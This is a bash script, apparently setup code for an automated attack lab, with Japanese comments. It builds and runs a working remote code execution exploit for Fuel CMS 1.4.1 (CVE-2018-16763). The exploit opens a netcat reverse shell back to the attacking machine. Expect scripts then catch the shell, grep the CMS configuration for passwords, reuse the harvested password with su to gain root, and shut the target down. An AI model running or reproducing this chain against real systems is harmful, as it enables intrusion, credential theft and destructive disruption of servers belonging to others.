#!/bin/bash

MY_LOCAL_IP=`curl http://169.254.169.254/latest/meta-data/public-ipv4`

apt update -y
apt install expect -y

mkdir ~/work
mkdir ~/work/scripts
mkdir ~/work/outputs

### スクリプト準備
cat << EOF > ~/work/scripts/exploit.py
#!/usr/bin/env python3

# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
       cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $${MY_LOCAL_IP} 9001 >/tmp/f'

       main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

       r = requests.get(main_url)

       #<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

       output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
       print(output[0])
       if cmd == "exit":
               break
EOF

echo "exploit.py ファイルが作成されました。"

cat << 'EOF' > ~/work/scripts/reverse_shell_password_search.exp
#!/usr/bin/expect

# ncコマンドで接続を待ち受ける
spawn nc -lvnp 9001

# 接続があるまで待つ
expect "$" {
    # 接続があったらPythonのコマンドを送信
    send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
    send "grep -r password /var/www/html/fuelcms/fuel/application/config\n"
    expect "Password:"
}
EOF

echo "reverse_shell_password_search.exp ファイルが作成されました。"

cat << 'EOF' > ~/work/scripts/reverse_shell_with_password.exp
#!/usr/bin/expect

set password $env(PASSWORD)
# ncコマンドで接続を待ち受ける
spawn nc -lvnp 9001

# 接続があるまで待つ
expect "$" {
    # 接続があったらPythonのコマンドを送信
    send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
    send "su -\n"
    expect "Password:"
    send "$password\n"
    send "shutdown now\n"
}
EOF

echo "reverse_shell_with_password.exp ファイルが作成されました。"



### スクリプト実行
chmod +x ~/work/scripts/*

~/work/scripts/exploit.py -u http://${FUEL_CMS_IP}/ > /dev/null  &
PID=$!
~/work/scripts/reverse_shell_password_search.exp > ~/work/outputs/output1
kill $PID

~/work/scripts/exploit.py -u http://${FUEL_CMS_IP}/ > /dev/null  &
PID=$!
export PASSWORD=`grep -r password ~/work/outputs | awk -F"'" '/password/ && $4 {print $4}'`
~/work/scripts/reverse_shell_with_password.exp > ~/work/outputs/output2
kill $PID
